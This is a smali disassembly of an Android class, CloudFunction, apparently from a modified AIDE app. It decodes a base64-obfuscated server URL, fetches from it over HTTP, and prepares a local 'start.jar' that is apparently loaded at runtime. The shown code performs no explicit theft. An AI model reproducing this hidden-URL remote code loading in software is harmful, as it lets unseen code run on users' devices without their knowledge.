.class public Lcom/s1243808733/aide/CloudFunction;
.super Ljava/lang/Object;
.source "CloudFunction.java"


# static fields
.field public static final INSTANCE:Lcom/s1243808733/aide/CloudFunction;

.field public static final OK:I = 0x2

.field public static final RUNING:I = 0x1


# instance fields
.field status:I


# direct methods
.method static final constructor <clinit>()V
    .registers 1

    new-instance v0, Lcom/s1243808733/aide/CloudFunction;

    invoke-direct {v0}, Lcom/s1243808733/aide/CloudFunction;-><init>()V

    sput-object v0, Lcom/s1243808733/aide/CloudFunction;->INSTANCE:Lcom/s1243808733/aide/CloudFunction;

    return-void
.end method

.method constructor <init>()V
    .registers 1

    .line 26
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method static synthetic access$1000008(Lcom/s1243808733/aide/CloudFunction;)V
    .registers 1

    invoke-direct {p0}, Lcom/s1243808733/aide/CloudFunction;->loadFunction()V

    return-void
.end method

.method static synthetic access$1000009(Lcom/s1243808733/aide/CloudFunction;)Ljava/io/File;
    .registers 2

    invoke-direct {p0}, Lcom/s1243808733/aide/CloudFunction;->getFunctionFile()Ljava/io/File;

    move-result-object v0

    return-object v0
.end method

.method private de()Ljava/lang/String;
    .registers 2

    .line 37
    invoke-static {}, Lcom/s1243808733/util/Utils;->getApp()Landroid/app/Application;

    move-result-object v0

    if-nez v0, :cond_0

    .line 38
    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0}, Ljava/lang/RuntimeException;-><init>()V

    throw v0

    .line 39
    :cond_0
    const-string v0, "aHR0cHM6Ly9hcGkuYWlkZXByby50b3AvZnVuY3Rpb25z"

    return-object v0
.end method

.method private getFunctionFile()Ljava/io/File;
    .registers 4

    .line 144
    new-instance v0, Ljava/io/File;

    invoke-static {}, Lcom/s1243808733/util/Utils;->getFunctionDir()Ljava/io/File;

    move-result-object v1

    const-string v2, "start.jar"

    invoke-direct {v0, v1, v2}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    return-object v0
.end method

.method private loadFunction()V
    .registers 3
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 116
    iget v0, p0, Lcom/s1243808733/aide/CloudFunction;->status:I

    const/4 v1, 0x2

    if-ne v0, v1, :cond_0

    .line 119
    :goto_0
    return-void

    .line 117
    :cond_0
    const/4 v0, 0x0

    iput v0, p0, Lcom/s1243808733/aide/CloudFunction;->status:I

    .line 119
    invoke-static {}, Lorg/xutils/x;->task()Lorg/xutils/common/TaskController;

    move-result-object v0

    new-instance v1, Lcom/s1243808733/aide/CloudFunction$100000002;

    invoke-direct {v1, p0}, Lcom/s1243808733/aide/CloudFunction$100000002;-><init>(Lcom/s1243808733/aide/CloudFunction;)V

    invoke-interface {v0, v1}, Lorg/xutils/common/TaskController;->post(Ljava/lang/Runnable;)V

    goto :goto_0
.end method


# virtual methods
.method public getStatus()I
    .registers 2

    .line 29
    iget v0, p0, Lcom/s1243808733/aide/CloudFunction;->status:I

    return v0
.end method

.method getUrl()Ljava/lang/String;
    .registers 3

    .line 33
    invoke-direct {p0}, Lcom/s1243808733/aide/CloudFunction;->de()Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x2

    invoke-static {v0, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v0

    invoke-static {v0}, Lcom/blankj/utilcode/util/ConvertUtils;->bytes2String([B)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method public run()V
    .registers 4
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    const/4 v2, 0x1

    .line 43
    iget v0, p0, Lcom/s1243808733/aide/CloudFunction;->status:I

    if-eq v0, v2, :cond_0

    iget v0, p0, Lcom/s1243808733/aide/CloudFunction;->status:I

    const/4 v1, 0x2

    if-ne v0, v1, :cond_1

    .line 47
    :cond_0
    :goto_0
    return-void

    .line 45
    :cond_1
    iput v2, p0, Lcom/s1243808733/aide/CloudFunction;->status:I

    .line 46
    new-instance v0, Lorg/xutils/http/RequestParams;

    invoke-virtual {p0}, Lcom/s1243808733/aide/CloudFunction;->getUrl()Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Lorg/xutils/http/RequestParams;-><init>(Ljava/lang/String;)V

    .line 47
    invoke-static {}, Lorg/xutils/x;->http()Lorg/xutils/HttpManager;

    move-result-object v1

    new-instance v2, Lcom/s1243808733/aide/CloudFunction$100000001;

    invoke-direct {v2, p0}, Lcom/s1243808733/aide/CloudFunction$100000001;-><init>(Lcom/s1243808733/aide/CloudFunction;)V

    invoke-interface {v1, v0, v2}, Lorg/xutils/HttpManager;->get(Lorg/xutils/http/RequestParams;Lorg/xutils/common/Callback$CommonCallback;)Lorg/xutils/common/Callback$Cancelable;

    goto :goto_0
.end method
